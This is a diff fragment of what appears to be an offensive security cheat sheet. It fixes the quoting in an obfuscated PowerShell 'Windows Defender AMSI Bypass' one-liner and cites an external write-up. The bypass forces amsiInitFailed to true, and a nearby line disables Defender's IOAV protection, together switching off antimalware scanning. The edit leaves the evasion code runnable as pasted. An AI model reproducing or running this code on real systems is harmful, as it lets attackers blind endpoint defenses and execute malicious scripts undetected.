@@ -77,7 +77,7 @@ Set-MpPreference -DisableIOAVProtection $true
 
 # Windows Defender AMSI Bypass  
 # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html
-sET-ItEM ( &apos;V&apos;+&apos;aR&apos; +  &apos;IA&apos; + &apos;blE:1q2&apos;  + &apos;uZx&apos;  ) ( [TYpE](  "{1}{0}"-F&apos;F&apos;,&apos;rE&apos;  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f&apos;Util&apos;,&apos;A&apos;,&apos;Amsi&apos;,&apos;.Management.&apos;,&apos;utomation.&apos;,&apos;s&apos;,&apos;System&apos;  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f&apos;amsi&apos;,&apos;d&apos;,&apos;InitFaile&apos;  ),(  "{2}{4}{0}{1}{3}" -f &apos;Stat&apos;,&apos;i&apos;,&apos;NonPubli&apos;,&apos;c&apos;,&apos;c,&apos;  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
+sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 ```
 
 ##  3. <a name='LATERALMOVEMENT'></a>LATERAL MOVEMENT
